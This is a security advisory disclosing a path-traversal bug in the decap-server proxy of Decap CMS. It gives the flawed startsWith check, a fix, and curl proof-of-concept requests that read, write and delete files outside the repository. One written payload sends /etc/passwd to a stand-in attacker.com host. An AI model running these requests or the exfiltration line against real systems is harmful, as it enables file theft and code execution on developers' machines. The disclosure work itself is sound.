https://github.com/decaporg/decap-cms/

## Finding: Path traversal in decap-server proxy allows read/write/delete of files outside the configured repository root

Affected version: commit 11f35405cd1a1d1216e97b890173f46436752019

### Summary

The decap-server local proxy (packages/decap-server) contains a path traversal vulnerability in its path containment check. The guard uses String.startsWith without appending a path separator, so a path pointing to a sibling directory whose name begins with the repository directory name bypasses the check. An attacker who can influence the file paths sent to the proxy API -- for example through a misconfigured CMS collection, a stored cross-site scripting vector in the admin UI, or DNS rebinding against a developer's workstation -- can read, write, or delete files anywhere on the host filesystem that reside in a directory whose name shares the repository directory name as a prefix.

### Details

The path containment check lives in:

packages/decap-server/src/middlewares/joi/customValidators.ts, lines 11-16:

```
validate(value, helpers) {
  const resolvedPath = path.join(repoPath, value);
  if (!resolvedPath.startsWith(repoPath)) {
    return { value, errors: helpers.error('path.invalid') };
  }
}
```

When repoPath is, for example, /home/user/myblog, the check passes for any resolved path that starts with the string /home/user/myblog. A resolved path of /home/user/myblog-uploads/database.sqlite also starts with /home/user/myblog, so it passes the check and is treated as within the repository. The same flaw exists in both operating modes (MODE=fs and MODE=git).

The input path ../myblog-uploads/database.sqlite is resolved by path.join to /home/user/myblog-uploads/database.sqlite (no traversal dots remain), and then the startsWith check passes because the resulting string begins with /home/user/myblog.

The Joi validation in customValidators.ts is the only path containment guard. Once it passes, the downstream handlers in localFs/index.ts and localGit/index.ts perform the actual file operations with no further boundary check.

Affected operations:
- getEntry / entriesByFiles: arbitrary file read (file contents returned in JSON response)
- getMediaFile: arbitrary file read (base64-encoded content returned)
- persistEntry: arbitrary file write (creates parent directories recursively)
- persistMedia: arbitrary file write (base64-decoded binary write)
- deleteFile / deleteFiles: arbitrary file delete

The fix is to append a path separator before the startsWith comparison:

```
if (!resolvedPath.startsWith(repoPath + path.sep)) {
```

This ensures that /home/user/myblog-uploads does not match /home/user/myblog/.

### PoC

Prerequisites:
- decap-server running in MODE=fs with GIT_REPO_DIRECTORY=/tmp/myrepo (default port 8081 or any configured port)
- A sibling directory exists whose name starts with the repo directory name: /tmp/myrepo-secret/
- File /tmp/myrepo-secret/credentials.env exists with content "DB_PASSWORD=hunter2"

Step 1 -- Read a file outside the repository:

```
curl -s http://127.0.0.1:8081/api/v1 \
  -H "Content-Type: application/json" \
  -H "Origin: http://localhost:3000" \
  -d '{
    "action": "getEntry",
    "params": {
      "path": "../myrepo-secret/credentials.env",
      "branch": "master"
    }
  }'
```

Expected response (HTTP 200):
```
{"data":"DB_PASSWORD=hunter2\n","file":{"path":"../myrepo-secret/credentials.env","id":"<sha256>"}}
```

Step 2 -- Write an arbitrary file outside the repository:

```
curl -s http://127.0.0.1:8081/api/v1 \
  -H "Content-Type: application/json" \
  -H "Origin: http://localhost:3000" \
  -d '{
    "action": "persistEntry",
    "params": {
      "dataFiles": [{
        "slug": "payload",
        "path": "../myrepo-secret/injected.sh",
        "raw": "#!/bin/sh\ncurl https://attacker.com/$(cat /etc/passwd | base64)"
      }],
      "assets": [],
      "options": {
        "commitMessage": "normal commit message",
        "useWorkflow": false,
        "status": "draft"
      },
      "branch": "master"
    }
  }'
```

Expected response (HTTP 200):
```
{"message":"entry persisted"}
```

Step 3 -- Delete a file outside the repository:

```
curl -s http://127.0.0.1:8081/api/v1 \
  -H "Content-Type: application/json" \
  -H "Origin: http://localhost:3000" \
  -d '{
    "action": "deleteFile",
    "params": {
      "path": "../myrepo-secret/injected.sh",
      "branch": "master",
      "options": {
        "commitMessage": "normal commit message"
      }
    }
  }'
```

Expected response (HTTP 200):
```
{"message":"deleted file ../myrepo-secret/injected.sh"}
```

All steps above were reproduced live against decap-server commit 11f35405 with:
- GIT_REPO_DIRECTORY=/tmp/decap-testrepo
- Sibling directory /tmp/decap-testrepo-evil containing secret.txt
- All four operations (read, write, binary write, delete) succeeded with HTTP 200

### Impact

The decap-server proxy is intended for local development and runs without any authentication. The CORS configuration (Origin regex anchored to localhost/127.0.0.1) correctly prevents cross-origin browser requests from arbitrary websites. However, the path traversal is reachable by:

1. A developer who configures a CMS collection's folder path to traverse outside the repository (misconfiguration, or a malicious config.yml committed to the repo).
2. A stored XSS in the CMS admin UI that causes the developer's browser to send API requests with attacker-controlled paths (the request originates from localhost, satisfying the CORS check).
3. DNS rebinding attacks: if the server binds to 0.0.0.0 (the default when BIND_HOST is not set), a LAN peer or a DNS rebinding attack from the browser can reach the API directly with an arbitrary Origin value set to the resolved domain, bypassing the CORS guard.

In all cases an attacker gains arbitrary read, write, and delete of host filesystem files in directories whose names start with the repository directory name. Because decap-server runs as the developer's user account, a write primitive targeting shell startup files, SSH authorized_keys, git hooks, or CI configuration scripts leads to code execution under that user's privileges.


### Disclosure

 - 2 June 2026 - reported via https://github.com/decaporg/decap-cms/security/advisories/GHSA-8qf9-j8m4-8f9r
 - July 2026 - no response, reported to https://github.com/decaporg/decap-cms/pull/7875
 - 17 September 2026 - no response to GHSA, issue is deleted, disclosed
